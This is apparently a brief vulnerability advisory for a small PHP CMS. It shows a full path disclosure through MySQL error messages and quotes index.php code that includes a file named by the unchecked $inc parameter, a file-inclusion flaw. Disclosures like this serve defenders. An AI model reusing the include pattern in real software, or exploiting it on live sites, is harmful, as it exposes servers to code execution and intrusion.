1.Full path disclosure: 

Let's try to request like this: 

http://localhost/cms/adm_pages.php 

and we get standard error messages like that: 

Warning: mysql_query(): supplied argument is not a valid MySQL-Link resource in c:\appserv\www\cms\adm_pages.php on line 2 
No blocks in the table 

The Problem also in corr_pages.php,del_block.php,del_page.php,footer.php,home.php etc. 


2.Include file 

Ok let's open ./index.php,We see 

if (!isset($inc)): 
    include ("home.php"); 
else: 
    include ($inc.".php"); 
endif; 

O Yeah!See u Again Include Vul!
